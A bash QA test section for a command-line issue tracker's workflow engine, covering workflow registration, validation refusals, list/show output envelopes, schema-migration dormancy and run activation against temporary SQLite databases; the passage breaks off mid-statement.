#!/usr/bin/env bash
# Section ZG: workflow grammar, registration, and the workflow verbs
#
# Covers phase 1 of the engine spine (docs/design/engine-spec.md §11.1-§11.2;
# TDD docs/tdd/engine-spine.md §4). The verbs register|list|show|init over a
# dormant workflows table: nothing activates, nothing schedules, no step exists.
#
# ZG1 is the §9 item 1 stranger-test loop, closed mechanically: `workflow init`
# writes a template, and the QA registers exactly what it wrote. ZG7 is the
# phase-1 dormancy proof (§3), including the 4->7 fixture protocol.

# zg_step_id maps a rendered `name@k#i` instance to its STEP-N id.
#
# The loop run addresses steps by INSTANCE because that is the identity §11.3
# makes public and the one the assertions are about; the verbs take STEP-N. A
# run that hardcoded step ids would break the moment a loop entry inserted rows
# and shifted the numbering, which is exactly what ZG20 makes happen.
zg_step_id() {
  sqlite3 "$1/issues.db" "SELECT 'STEP-' || id FROM steps WHERE instance='$2';"
}

# zg_ready_instances lists the instances `next --run` currently offers as
# CLAIMABLE (status=ready) — the staged closure rides the same answer at
# status=staged and is deliberately excluded here, since every caller asks
# "what may run now".
#
# It reads through the VERB rather than through SQL: readiness is computed
# (§6.2), so a SQL query for `status='ready'` would find nothing and quietly
# pass every assertion built on it.
zg_ready_instances() {
  run_env "$1" next --run RUN-1 --json >/dev/null 2>&1
  printf '%s' "$CMD_STDOUT" |
    jq -r '.data.steps[]? | select(.status=="ready") | .instance' 2>/dev/null |
    tr '\n' ' '
}

# zg_complete_step claims an instance and completes it, through the ordinary
# verbs and the real token transport.
#
# Every step of the loop run goes through this: claim (which mints the token),
# then `complete` with the token in DOCKET_TOKEN — never in argv (§4). The
# payload argument is optional and is what drives `verify`'s threshold.
# zg_trust_fixture_gates approves every gate the committed fixture declares, so
# a section whose subject is NOT the trust model can drive a run to `done`.
#
# Gates became real at stage 4: with an empty allowlist every one is correctly
# `unmatched`, which fails its step and parks the run `waiting-human`
# (gates-trust §6.2 N3). That is the engine behaving correctly, and the sections
# that assert liveness (ZG16's killed claimer, §9 item 4) or supersession
# (ZG20's highest-ordinal completion) would otherwise be measuring the trust
# model instead of their own subject.
#
# `/usr/bin/true` is deliberately the most boring possible command: these
# sections care only that the gate PASSES. ZG13 is where a witness command
# proves a real process ran.
zg_trust_fixture_gates() {
  local ZG_ENV="$1" ZG_G
  assert_trust_sandbox
  for ZG_G in build tests scope self-hygiene secret-scan \
              ac-commands commit-msg commit-exec; do
    run_env "$ZG_ENV" trust add "$ZG_G" --yes -- /usr/bin/true >/dev/null
  done
}

zg_complete_step() {
  local ZG_ENV="$1" ZG_INST="$2" ZG_ART="$3" ZG_PAY="${4:-}"
  local ZG_SID ZG_TK
  ZG_SID=$(zg_step_id "$ZG_ENV" "$ZG_INST")
  if [ -z "$ZG_SID" ]; then
    CMD_EXIT=1
    return 1
  fi

  run_env "$ZG_ENV" step claim "$ZG_SID" --owner zg-loop --json
  ZG_TK=$(printf '%s' "$CMD_STDOUT" | jq -r '.data.token // empty')
  if [ -z "$ZG_TK" ]; then
    CMD_EXIT=1
    return 1
  fi

  if [ -n "$ZG_PAY" ]; then
    DOCKET_TOKEN="$ZG_TK" run_env "$ZG_ENV" step complete "$ZG_SID" \
      --artifact-file "$ZG_ART" --payload-file "$ZG_PAY" --json
  else
    DOCKET_TOKEN="$ZG_TK" run_env "$ZG_ENV" step complete "$ZG_SID" \
      --artifact-file "$ZG_ART" --json
  fi
}

test_zg_workflow() {
  printf "Section ZG: Workflows — grammar, registration, and verbs"

  local FIXTURE="$SCRIPT_DIR/../docs/design/example-workflow.toml"
  # The schema the committed fixture DECLARES. `reconcile` is an
  # `action = "aggregate"` step, and V29 requires such a step to name a schema
  # that declares `params.field` as an `ordered_enum` — median is defined only
  # over an order. So every repo below registers the schema BEFORE the workflow,
  # which is also the ordering §4.6 pins for S6's auto-registration.
  #
  # It lives in scripts/qa/fixtures/, which the genericity gate does not scan,
  # because it is INSTANCE DATA BY LOCATION (§1.1.1).
  local ZG_SCHEMA="$SCRIPT_DIR/qa/fixtures/schemas/findings@1.json"
  local ZG_TMP
  ZG_TMP=$(qa_mktemp_d)

  # ---------------------------------------------------------------------------
  # ZG0: the committed fixture registers clean, end to end, through the CLI.
  #
  # The Go tests parse and validate it in-process; this proves the whole path —
  # file read, parse, validate, lint, insert, envelope — actually works.
  # ---------------------------------------------------------------------------

  if [ ! -f "$FIXTURE" ]; then
    check "ZG" "ZG0_fixture_exists" "FAIL" "missing fixture $FIXTURE"
    rm -rf "$ZG_TMP"
    return
  fi
  check "ZG" "ZG0_fixture_exists" "PASS"

  # Schemas before workflows (§4.6). This one registration serves every later
  # `run`-based check in this section, which all share the suite's database.
  run schema register findings@1 "$ZG_SCHEMA" --json
  assert_exit "ZG" "ZG0_schema_register" 0

  run workflow register "$FIXTURE" --json
  assert_exit "ZG" "ZG0_register" 0
  assert_json "ZG" "ZG0_name" ".data.name" "standard-change"
  assert_json "ZG" "ZG0_version" ".data.version" "1"
  assert_json_exists "ZG" "ZG0_sha" ".data.source_sha256"
  # The parsed definition rides in the envelope as embedded JSON, not as a
  # string a consumer would have to decode a second time.
  assert_json_exists "ZG" "ZG0_definition" ".data.definition.pipeline.name"
  assert_json_array_min "ZG" "ZG0_steps" ".data.definition.steps" 8

  # The fixture's own features, so a future edit that guts it is caught here
  # and not only in the Go table.
  local FANOUT LOOPY HUMAN
  FANOUT=$(echo "$CMD_STDOUT" | jq '[.data.definition.steps[] | select(.fanout)] | length')
  LOOPY=$(echo "$CMD_STDOUT" | jq '[.data.definition.steps[] | select(.loop == true)] | length')
  HUMAN=$(echo "$CMD_STDOUT" | jq '[.data.definition.steps[] | select(.type == "human")] | length')
  if [ "$FANOUT" -ge 1 ] && [ "$LOOPY" -ge 1 ] && [ "$HUMAN" -ge 1 ]; then
    check "ZG" "ZG0_exercises_grammar" "PASS"
  else
    check "ZG" "ZG0_exercises_grammar" "FAIL" \
      "fanout=$FANOUT loop=$LOOPY human=$HUMAN, want >=1 of each"
  fi

  # The A4 amendment applied to the fixture: its human step declares
  # on_fail explicitly and does not route rejects to waiting-human.
  local GATE_ONFAIL
  GATE_ONFAIL=$(echo "$CMD_STDOUT" | jq -r \
    '.data.definition.steps[] | select(.type == "human") | .on_fail')
  check_cond "ZG" "ZG0_human_on_fail" "human step on_fail = '$GATE_ONFAIL', want fix-loop" [ "$GATE_ONFAIL" = "fix-loop" ]

  # ---------------------------------------------------------------------------
  # ZG1: the stranger test, closed mechanically (§9 item 1).
  #
  # `workflow init` writes a template; the QA registers exactly what it wrote.
  # A shipped template that fails its own validator is the worst possible first
  # experience, and it is the kind of thing that rots silently as the validator
  # grows — so the loop is a test, not an aspiration.
  # ---------------------------------------------------------------------------

  run workflow init --template standard-dev --dir "$ZG_TMP/wf" --json
  assert_exit "ZG" "ZG1_init" 0
  assert_json "ZG" "ZG1_template" ".data.template" "standard-dev"

  local WROTE
  WROTE=$(echo "$CMD_STDOUT" | jq -r '.data.path')
  check_cond "ZG" "ZG1_wrote_file" "init reported $WROTE but wrote nothing" [ -f "$WROTE" ]

  run workflow register "$WROTE" --json
  assert_exit "ZG" "ZG1_register_what_init_wrote" 0
  assert_json "ZG" "ZG1_registered_name" ".data.name" "standard-dev"

  # The stranger test's own shape: three steps, no fanout anywhere, and one
  # fenced-command gate. A human-only team gets exactly this by typing one
  # command.
  #
  # THREE, not two, since DKT-196: `check` and `approve` both route `fix-loop`,
  # and a `fix-loop` routing with no `loop = true` step supersedes the run's
  # own work and replaces it with nothing. The template gained the `fix` body
  # those routings actually create, and register now refuses the shape without
  # it — so a two-step expectation here is asserting the defect.
  local NSTEPS NFANOUT NFENCE
  NSTEPS=$(echo "$CMD_STDOUT" | jq '.data.definition.steps | length')
  NFANOUT=$(echo "$CMD_STDOUT" | jq '[.data.definition.steps[] | select(.fanout)] | length')
  NFENCE=$(echo "$CMD_STDOUT" | jq \
    '[.data.definition.steps[].gates // [] | .[] | select(.source // "" | startswith("fence:"))] | length')
  if [ "$NSTEPS" = "3" ] && [ "$NFANOUT" = "0" ] && [ "$NFENCE" = "1" ]; then
    check "ZG" "ZG1_stranger_shape" "PASS"
  else
    check "ZG" "ZG1_stranger_shape" "FAIL" \
      "steps=$NSTEPS fanout=$NFANOUT fenced-gates=$NFENCE, want 3/0/1"
  fi

  # The other shipped template registers clean too.
  run workflow init --template parallel-check --dir "$ZG_TMP/wf" --json
  assert_exit "ZG" "ZG1_init_parallel" 0
  run workflow register "$ZG_TMP/wf/parallel-check.toml" --json
  assert_exit "ZG" "ZG1_register_parallel" 0
  assert_json "ZG" "ZG1_parallel_name" ".data.name" "parallel-check"

  # ---------------------------------------------------------------------------
  # ZG2: the §4.5 refusal matrix, by exit code AND by machine-readable code.
  # ---------------------------------------------------------------------------

  # Grammar/validation failure -> VALIDATION_ERROR (3). A type="human" step
  # declaring no on_fail is V13a: the effective routing would be
  # waiting-human, which parks the issue on the resolution of the thing that
  # just rejected it.
  cat > "$ZG_TMP/invalid.toml" <<'TOML'
[pipeline]
name = "zg-invalid"
version = 1

[[step]]
name = "gate"
type = "human"
TOML
  run workflow register "$ZG_TMP/invalid.toml" --json
  assert_exit "ZG" "ZG2_validation_exit" 3
  assert_json "ZG" "ZG2_validation_code" ".code" "VALIDATION_ERROR"
  assert_stdout_contains "ZG" "ZG2_validation_names_step" "gate"
  assert_stdout_contains "ZG" "ZG2_validation_names_field" "on_fail"

  # Strict decoding: an unknown key names the key and its step.
  cat > "$ZG_TMP/typo.toml" <<'TOML'
[pipeline]
name = "zg-typo"
version = 1

[[step]]
name = "only"
after = []
executor = "someone"
emits = "result"
max_attempt = 2
TOML
  run workflow register "$ZG_TMP/typo.toml" --json
  assert_exit "ZG" "ZG2_strict_exit" 3
  assert_json "ZG" "ZG2_strict_code" ".code" "VALIDATION_ERROR"
  assert_stdout_contains "ZG" "ZG2_strict_names_key" "max_attempt"
  assert_stdout_contains "ZG" "ZG2_strict_names_step" "only"

  # A cycle reports STEP NAMES, never DKT-N: CycleError carries the indices
  # this layer assigned, and rendering them as issue ids would be nonsense.
  cat > "$ZG_TMP/cycle.toml" <<'TOML'
[pipeline]
name = "zg-cycle"
version = 1

[[step]]
name = "alpha"
after = ["gamma"]
executor = "someone"
emits = "result"

[[step]]
name = "beta"
after = ["alpha"]
executor = "someone"
emits = "result"

[[step]]
name = "gamma"
after = ["beta"]
executor = "someone"
emits = "result"
TOML
  run workflow register "$ZG_TMP/cycle.toml" --json
  assert_exit "ZG" "ZG2_cycle_exit" 3
  assert_stdout_contains "ZG" "ZG2_cycle_names_steps" "alpha"
  if echo "$CMD_STDOUT" | grep -q "DKT-"; then
    check "ZG" "ZG2_cycle_not_issue_ids" "FAIL" "the cycle rendered issue ids"
  else
    check "ZG" "ZG2_cycle_not_issue_ids" "PASS"
  fi

  # File unreadable / not found -> NOT_FOUND (2).
  run workflow register "$ZG_TMP/does-not-exist.toml" --json
  assert_exit "ZG" "ZG2_missing_file_exit" 2
  assert_json "ZG" "ZG2_missing_file_code" ".code" "NOT_FOUND"

  # Re-register IDENTICAL bytes -> idempotent success (0).
  run workflow register "$FIXTURE" --json
  assert_exit "ZG" "ZG2_idempotent_exit" 0
  assert_json "ZG" "ZG2_idempotent_name" ".data.name" "standard-change"

  # Re-register DIFFERING bytes at the same name@version -> CONFLICT (4),
  # naming both hashes. A registered name@version is frozen: version pinning
  # is worth nothing if the pinned bytes can be swapped underneath a run.
  cp "$FIXTURE" "$ZG_TMP/edited.toml"
  printf '\n# an edit that changes the bytes but not the meaning\n' >> "$ZG_TMP/edited.toml"
  run workflow register "$ZG_TMP/edited.toml" --json
  assert_exit "ZG" "ZG2_conflict_exit" 4
  assert_json "ZG" "ZG2_conflict_code" ".code" "CONFLICT"
  assert_stdout_contains "ZG" "ZG2_conflict_names_ref" "standard-change@1"

  # The refused registration did not apply.
  run workflow show standard-change@1 --json
  assert_exit "ZG" "ZG2_conflict_no_write" 0
  local STORED_SHA
  STORED_SHA=$(echo "$CMD_STDOUT" | jq -r '.data.source_sha256')

  # `workflow show` on an unregistered name/version -> NOT_FOUND (2).
  run workflow show no-such-workflow --json
  assert_exit "ZG" "ZG2_show_missing_exit" 2
  assert_json "ZG" "ZG2_show_missing_code" ".code" "NOT_FOUND"
  run workflow show standard-change@99 --json
  assert_exit "ZG" "ZG2_show_missing_version_exit" 2
  assert_json "ZG" "ZG2_show_missing_version_code" ".code" "NOT_FOUND"

  # `workflow init` target exists without --force -> CONFLICT (4).
  run workflow init --template standard-dev --dir "$ZG_TMP/wf" --json
  assert_exit "ZG" "ZG2_init_conflict_exit" 4
  assert_json "ZG" "ZG2_init_conflict_code" ".code" "CONFLICT"
  assert_stdout_contains "ZG" "ZG2_init_conflict_names_path" "standard-dev.toml"

  # ...and --force overwrites.
  run workflow init --template standard-dev --dir "$ZG_TMP/wf" --force --json
  assert_exit "ZG" "ZG2_init_force" 0

  # ---------------------------------------------------------------------------
  # ZG3: stdin registration — configuration generated in a pipeline needs no
  # temporary file.
  # ---------------------------------------------------------------------------

  local STDIN_WF
  STDIN_WF=$(cat <<'TOML'
[pipeline]
name = "zg-from-stdin"
version = 1

[[step]]
name = "only"
after = []
executor = "someone"
emits = "result"
TOML
)
  run_stdin "$STDIN_WF" workflow register - --json
  assert_exit "ZG" "ZG3_stdin_exit" 0
  assert_json "ZG" "ZG3_stdin_name" ".data.name" "zg-from-stdin"
  # stdin has no path to record, and source_path is provenance only.
  assert_json_null "ZG" "ZG3_stdin_no_path" ".data.source_path"

  # ---------------------------------------------------------------------------
  # ZG4: `workflow show` — version selection and --source.
  # ---------------------------------------------------------------------------

  # Register a second version, so "highest" is a real choice.
  run_stdin "${STDIN_WF/version = 1/version = 4}" workflow register - --json
  assert_exit "ZG" "ZG4_v4" 0

  run workflow show zg-from-stdin --json
  assert_exit "ZG" "ZG4_show_exit" 0
  assert_json "ZG" "ZG4_highest_version" ".data.version" "4"

  run workflow show zg-from-stdin@1 --json
  assert_json "ZG" "ZG4_exact_version" ".data.version" "1"

  # --source emits the stored TOML verbatim: what comes out is what was hashed.
  run workflow show standard-change@1 --source
  assert_exit "ZG" "ZG4_source_exit" 0
  local SOURCE_SHA
  SOURCE_SHA=$(printf '%s\n' "$CMD_STDOUT" | shasum -a 256 | cut -d' ' -f1)
  check_cond "ZG" "ZG4_source_is_registered_bytes" "--source hashes $SOURCE_SHA, registered $STORED_SHA" [ "$SOURCE_SHA" = "$STORED_SHA" ]

  # A malformed ref is a VALIDATION_ERROR, not a NOT_FOUND: the request is
  # unintelligible rather than unsatisfiable.
  run workflow show "zg-from-stdin@x" --json
  assert_exit "ZG" "ZG4_bad_ref_exit" 3
  assert_json "ZG" "ZG4_bad_ref_code" ".code" "VALIDATION_ERROR"

  # ---------------------------------------------------------------------------
  # ZG5: `workflow list` — the v2 Collection envelope.
  # ---------------------------------------------------------------------------

  run workflow list --json
  assert_exit "ZG" "ZG5_list_exit" 0
  assert_json_array_min "ZG" "ZG5_list_v1_shape" ".data.workflows" 4

  run workflow list --json=v2
  assert_exit "ZG" "ZG5_list_v2_exit" 0
  assert_json_exists "ZG" "ZG5_v2_items" ".data.items"
  assert_json_exists "ZG" "ZG5_v2_total" ".data.total"
  assert_json "ZG" "ZG5_v2_not_truncated" ".data.truncated" "false"
  # Under v2 every item carries the CAS row version, named apart from the
  # definition's version so a consumer cannot pin the wrong number. Both are
  # asserted: an item carrying only one of them is the bug this catches.
  assert_json_all "ZG" "ZG5_v2_row_versions" ".data.items" "has(\"row_version\")"
  assert_json_all "ZG" "ZG5_v2_definition_versions" ".data.items" "has(\"version\")"

  # ...and v1 items carry no row_version at all — the dormancy rule at the
  # envelope, matching the v6 `lease` object's.
  run workflow list --json
  assert_json_all "ZG" "ZG5_v1_no_row_version" ".data.workflows" \
    "has(\"row_version\") | not"

  # The total ignores the limit, so truncation is computable rather than
  # guessed.
  local V2_TOTAL
  V2_TOTAL=$(echo "$CMD_STDOUT" | jq '.data.total')
  run workflow list --json=v2 --limit 1
  assert_json "ZG" "ZG5_limit_items" ".data.items | length" "1"
  assert_json "ZG" "ZG5_limit_total_unchanged" ".data.total" "$V2_TOTAL"
  assert_json "ZG" "ZG5_limit_truncated" ".data.truncated" "true"

  # --name filters.
  run workflow list --json --name standard-change
  assert_json "ZG" "ZG5_name_filter" ".data.total" "1"

  # ---------------------------------------------------------------------------
  # ZG6: v1 output carries no row_version — the dormancy rule at the envelope.
  # ---------------------------------------------------------------------------

  run workflow show standard-change --json
  assert_json_null "ZG" "ZG6_v1_no_row_version" ".data.row_version"
  run workflow show standard-change --json=v2
  assert_json "ZG" "ZG6_v2_row_version" ".data.row_version" "1"

  # ---------------------------------------------------------------------------
  # ZG7: phase-1 dormancy (§3).
  #
  # A repo with zero rows in `workflows` behaves byte-identically to v6 on
  # every pre-existing verb. The full sweep lives in scripts/compat-sweep.sh
  # and runs against the previous stage's binary; here the claim is proven
  # against a workflow-free database in this build.
  # ---------------------------------------------------------------------------

  local ZG_CLEAN
  ZG_CLEAN=$(qa_mktemp_d)
  run_env "$ZG_CLEAN" init
  assert_exit "ZG" "ZG7_clean_init" 0

  # The table exists and is empty: dormant by construction.
  local NWF
  NWF=$(sqlite3 "$ZG_CLEAN/issues.db" "SELECT COUNT(*) FROM workflows;" 2>/dev/null || echo "ERR")
  check_cond "ZG" "ZG7_workflows_empty" "workflows has $NWF rows in a fresh repo" [ "$NWF" = "0" ]

  # `next` — the verb phase 3 will teach a second mode — is byte-identical
  # between a workflow-free repo and one that has registered workflows but
  # activated nothing. Registration alone must change no existing verb.
  run_env "$ZG_CLEAN" issue create -t "ZG dormancy subject" --json
  assert_exit "ZG" "ZG7_seed_issue" 0
  run_env "$ZG_CLEAN" issue move DKT-1 todo --json
  local NEXT_BEFORE LIST_BEFORE
  run_env "$ZG_CLEAN" next --json
  NEXT_BEFORE="$CMD_STDOUT"
  run_env "$ZG_CLEAN" issue list --all --json
  LIST_BEFORE="$CMD_STDOUT"

  if [ -n "$NEXT_BEFORE" ] && [ -n "$LIST_BEFORE" ]; then
    check "ZG" "ZG7_nonempty" "PASS"
  else
    check "ZG" "ZG7_nonempty" "FAIL" "the pre-registration reads were empty"
  fi

  run_env "$ZG_CLEAN" schema register findings@1 "$ZG_SCHEMA" --json >/dev/null
  run_env "$ZG_CLEAN" workflow register "$FIXTURE" --json
  assert_exit "ZG" "ZG7_register_into_clean" 0

  local NEXT_AFTER LIST_AFTER
  run_env "$ZG_CLEAN" next --json
  NEXT_AFTER="$CMD_STDOUT"
  run_env "$ZG_CLEAN" issue list --all --json
  LIST_AFTER="$CMD_STDOUT"

  check_cond "ZG" "ZG7_next_unchanged" "next output changed after registering a workflow" [ "$NEXT_BEFORE" = "$NEXT_AFTER" ]
  check_cond "ZG" "ZG7_list_unchanged" "issue list changed after registering a workflow" [ "$LIST_BEFORE" = "$LIST_AFTER" ]

  rm -rf "$ZG_CLEAN"

  # ---------------------------------------------------------------------------
  # ZG8: the §9 item 8 fixture protocol, 4 -> 7 in ONE pass.
  #
  # The v7 structures are asserted present BEFORE the golden diff is trusted:
  # a diff against a database that failed to migrate passes vacuously and would
  # prove nothing.
  # ---------------------------------------------------------------------------

  local ZG_FX
  ZG_FX=$(qa_mktemp_d)
  cp "$SCRIPT_DIR/qa/fixtures/v4-baseline.db" "$ZG_FX/issues.db"

  local FX_BEFORE
  FX_BEFORE=$(sqlite3 "$ZG_FX/issues.db" "SELECT value FROM meta WHERE key='schema_version';")
  check_cond "ZG" "ZG8_fixture_is_v4" "fixture schema_version=$FX_BEFORE, want 4" [ "$FX_BEFORE" = "4" ]

  local FX_LIST_BEFORE FX_SHOW_BEFORE
  run_env "$ZG_FX" issue list --all --json
  FX_LIST_BEFORE="$CMD_STDOUT"
  assert_exit "ZG" "ZG8_open_v4" 0
  run_env "$ZG_FX" issue show DKT-1 --json
  FX_SHOW_BEFORE="$CMD_STDOUT"

  if [ -n "$FX_LIST_BEFORE" ] && [ -n "$FX_SHOW_BEFORE" ]; then
    check "ZG" "ZG8_nonempty" "PASS"
  else
    check "ZG" "ZG8_nonempty" "FAIL" "fixture reads were empty"
  fi

  # One pass, all the way to the current version.
  run_env "$ZG_FX" config --json
  assert_json "ZG" "ZG8_migrated_to_current" ".data.schema_version" "$CURRENT_SCHEMA_VERSION"

  # v7 structures present — asserted BEFORE the diff is trusted.
  local NTBL
  NTBL=$(sqlite3 "$ZG_FX/issues.db" \
    "SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='workflows';")
  check_cond "ZG" "ZG8_workflows_table" "workflows table missing after 4->7" [ "$NTBL" = "1" ]
  local NIDX
  NIDX=$(sqlite3 "$ZG_FX/issues.db" \
    "SELECT COUNT(*) FROM sqlite_master WHERE type='index' AND name='idx_workflows_name';")
  check_cond "ZG" "ZG8_workflows_index" "idx_workflows_name missing after 4->7" [ "$NIDX" = "1" ]

  # A v4 repo has never registered a workflow, so the whole mechanism is
  # dormant on it.
  local FX_NWF
  FX_NWF=$(sqlite3 "$ZG_FX/issues.db" "SELECT COUNT(*) FROM workflows;")
  check_cond "ZG" "ZG8_migrated_rows_dormant" "$FX_NWF workflows in a migrated v4 repo" [ "$FX_NWF" = "0" ]

  # Golden diff: identical output before and after the migration.
  local FX_LIST_AFTER FX_SHOW_AFTER
  run_env "$ZG_FX" issue list --all --json
  FX_LIST_AFTER="$CMD_STDOUT"
  run_env "$ZG_FX" issue show DKT-1 --json
  FX_SHOW_AFTER="$CMD_STDOUT"

  check_cond "ZG" "ZG8_golden_list" "issue list changed across the 4->7 migration" [ "$FX_LIST_BEFORE" = "$FX_LIST_AFTER" ]
  check_cond "ZG" "ZG8_golden_show" "issue show changed across the 4->7 migration" [ "$FX_SHOW_BEFORE" = "$FX_SHOW_AFTER" ]

  # The migration is idempotent — a second open must not move the version.
  run_env "$ZG_FX" config --json
  assert_json "ZG" "ZG8_idempotent" ".data.schema_version" "$CURRENT_SCHEMA_VERSION"

  # The phase-2 tables landed in the same 4->7 pass — the migration is ONE
  # function assembled across the stage's phases, so a v4 database arriving
  # after phase 2 gets all of them at once.
  local FX_MISSING=""
  local T
  for T in runs run_issues pins run_fences steps; do
    if [ "$(sqlite3 "$ZG_FX/issues.db" \
        "SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='$T';")" != "1" ]; then
      FX_MISSING="$FX_MISSING $T"
    fi
  done
  check_cond "ZG" "ZG8_activation_tables" "missing after 4->7:$FX_MISSING" [ -z "$FX_MISSING" ]

  # `issues.scope_globs` is the ONE touch v7 makes to an existing table, and
  # it must be NULL on every row a v4 database brought with it (§3 phase-2
  # dormancy). A default of '[]' would make every legacy issue read as "scope
  # declared, empty", which is a different fact from "no scope declared".
  local FX_SCOPED
  FX_SCOPED=$(sqlite3 "$ZG_FX/issues.db" \
    "SELECT COUNT(*) FROM issues WHERE scope_globs IS NOT NULL;")
  check_cond "ZG" "ZG8_scope_globs_null" "$FX_SCOPED pre-existing issues carry a scope_globs value" [ "$FX_SCOPED" = "0" ]

  # The rewind guard: stamped at the current version with a sentinel missing
  # must re-migrate rather than trust the stamp. This is the exact shape a
  # phase-1-migrated database has when phases 2-4 land — including this repo's
  # own dogfood tracker — so it is exercised for EVERY sentinel, not just the
  # first. A guard that probed only `workflows` would see that table present,
  # do nothing, and leave the database half-migrated behind a stamp claiming
  # otherwise.
  #
  # The whole set is dropped and the survivors are not restored between
  # iterations, because SQLite resolves a DROP's foreign-key references:
  # removing `workflows` while `steps` still points at it fails on the
  # reference rather than producing the shape under test.
  sqlite3 "$ZG_FX/issues.db" <<'SQL'
DROP TABLE IF EXISTS steps;
DROP TABLE IF EXISTS run_fences;
DROP TABLE IF EXISTS pins;
DROP TABLE IF EXISTS run_issues;
DROP TABLE IF EXISTS runs;
DROP TABLE IF EXISTS workflows;
SQL

  # The stamp still says migrated. That is the trap.
  local STAMP_BEFORE_REWIND
  STAMP_BEFORE_REWIND=$(sqlite3 "$ZG_FX/issues.db" \
    "SELECT value FROM meta WHERE key='schema_version';")
  check_cond "ZG" "ZG8_rewind_premise" "stamp=$STAMP_BEFORE_REWIND before the guard runs, want $CURRENT_SCHEMA_VERSION" [ "$STAMP_BEFORE_REWIND" = "$CURRENT_SCHEMA_VERSION" ]

  run_env "$ZG_FX" issue list --all --json >/dev/null
  local REWIND_MISSING=""
  for T in workflows runs run_issues pins run_fences steps; do
    if [ "$(sqlite3 "$ZG_FX/issues.db" \
        "SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='$T';")" != "1" ]; then
      REWIND_MISSING="$REWIND_MISSING $T"
    fi
  done
  check_cond "ZG" "ZG8_rewind_guard" "the rewind guard did not restore:$REWIND_MISSING" [ -z "$REWIND_MISSING" ]

  # ---------------------------------------------------------------------------
  # ZG9: activation against a real issue graph (§5.3).
  #
  # The Go tests drive the fat transaction in-process; this proves the whole
  # path — CLI, envelope, exit code, and the rows that land — actually works
  # against a database an operator built with the ordinary issue verbs.
  #
  # NOTE ON GATES: nothing in this section executes a gate. At this stage the
  # gate runner is a specified PASS-THROUGH (TDD §5.6): it returns
  # {verdict: "pass", exit: 0, stub: true} without touching the process table.
  # A green run here is NOT gate coverage, and the `stub: true` flag exists
  # precisely so an operator can tell the difference. Gate execution lands at
  # stage 4.
  # ---------------------------------------------------------------------------

  local ZG_RUN
  ZG_RUN=$(qa_mktemp_d)
  run_env "$ZG_RUN" init
  assert_exit "ZG" "ZG9_init" 0

  run_env "$ZG_RUN" schema register findings@1 "$ZG_SCHEMA" --json >/dev/null
  run_env "$ZG_RUN" workflow register "$FIXTURE" --json
  assert_exit "ZG" "ZG9_register" 0

  # Two issues, the second depending on the first, so laziness is exercised:
  # only the phase-1 issue expands.
  run_env "$ZG_RUN" issue create -t "ZG9 first" -d "the first body" \
    --scope 'internal/db/**' --json
  assert_exit "ZG" "ZG9_issue_one" 0
  run_env "$ZG_RUN" issue create -t "ZG9 second" -d "the second body" --json
  assert_exit "ZG" "ZG9_issue_two" 0
  run_env "$ZG_RUN" issue link add DKT-2 depends-on DKT-1 --json
  assert_exit "ZG" "ZG9_link" 0

  run_env "$ZG_RUN" run start --issue DKT-1 --issue DKT-2 --budget 25 --json
  assert_exit "ZG" "ZG9_start" 0
  assert_json "ZG" "ZG9_start_status" ".data.status" "planning"
  assert_json "ZG" "ZG9_start_ref" ".data.run" "RUN-1"

  # --budget is stored and enforces nothing at this stage.
  assert_json "ZG" "ZG9_budget_stored" ".data.budget" "25"

  run_env "$ZG_RUN" run activate RUN-1 --json
  assert_exit "ZG" "ZG9_activate" 0
  assert_json "ZG" "ZG9_activated_status" ".data.run.status" "active"
  # BOTH issues bind and snapshot; only the unblocked one expands. Binding is
  # not lazy — expansion is.
  assert_json "ZG" "ZG9_bound_both" ".data.issues_bound" "2"
  assert_json "ZG" "ZG9_expanded_one" ".data.issues_expanded" "1"

  # The fixture's ordinal-0 topology: eight declared steps, `review` fanned
  # four ways, `fix` (loop = true) absent.
  assert_json "ZG" "ZG9_step_count" ".data.steps_created" "10"

  local ZG_DB="$ZG_RUN/issues.db"
  local INSTANCES
  INSTANCES=$(sqlite3 "$ZG_DB" "SELECT instance FROM steps ORDER BY id;" | tr '\n' ',')
  local WANT_INSTANCES="implement@0,review@0#0,review@0#1,review@0#2,review@0#3,synthesize@0,reconcile@0,verify@0,commit-gate@0,commit@0,"
  check_cond "ZG" "ZG9_instances" "got $INSTANCES want $WANT_INSTANCES" [ "$INSTANCES" = "$WANT_INSTANCES" ]

  # Every expanded step is `pending`. `ready` is COMPUTED at read time, never
  # stored — nothing may persist a step as ready and later discover it wasn't.
  local NOT_PENDING
  NOT_PENDING=$(sqlite3 "$ZG_DB" "SELECT COUNT(*) FROM steps WHERE status != 'pending';")
  check_cond "ZG" "ZG9_all_pending" "$NOT_PENDING steps are not pending at expansion" [ "$NOT_PENDING" = "0" ]

  # The step kinds carry the §11.1 alternative each step declared, which is
  # what phase 3's `claim` reads to refuse a human gate.
  local GATE_KIND ACTION_KIND
  GATE_KIND=$(sqlite3 "$ZG_DB" \
    "SELECT DISTINCT kind FROM steps WHERE step_name='commit-gate';")
  ACTION_KIND=$(sqlite3 "$ZG_DB" \
    "SELECT DISTINCT kind FROM steps WHERE step_name='reconcile';")
  if [ "$GATE_KIND" = "human" ] && [ "$ACTION_KIND" = "action" ]; then
    check "ZG" "ZG9_step_kinds" "PASS"
  else
    check "ZG" "ZG9_step_kinds" "FAIL" "commit-gate=$GATE_KIND reconcile=$ACTION_KIND"
  fi

  # The loop step is absent at ordinal 0 (§11.3 (3)).
  local NLOOP
  NLOOP=$(sqlite3 "$ZG_DB" "SELECT COUNT(*) FROM steps WHERE step_name='fix';")
  check_cond "ZG" "ZG9_loop_step_absent" "$NLOOP \`fix\` instances at ordinal 0" [ "$NLOOP" = "0" ]

  # The blocked issue expanded nothing and is not stamped expanded, so a later
  # re-activation picks it up.
  local BLOCKED_STEPS BLOCKED_EXPANDED
  BLOCKED_STEPS=$(sqlite3 "$ZG_DB" "SELECT COUNT(*) FROM steps WHERE issue_id=2;")
  BLOCKED_EXPANDED=$(sqlite3 "$ZG_DB" \
    "SELECT COUNT(*) FROM run_issues WHERE issue_id=2 AND expanded_at_ms IS NOT NULL;")
  if [ "$BLOCKED_STEPS" = "0" ] && [ "$BLOCKED_EXPANDED" = "0" ]; then
    check "ZG" "ZG9_lazy_expansion" "PASS"
  else
    check "ZG" "ZG9_lazy_expansion" "FAIL" \
      "blocked issue has $BLOCKED_STEPS steps, expanded=$BLOCKED_EXPANDED"
  fi

  # ...but it IS snapshotted: only expansion is lazy.
  local BLOCKED_SNAP
  BLOCKED_SNAP=$(sqlite3 "$ZG_DB" \
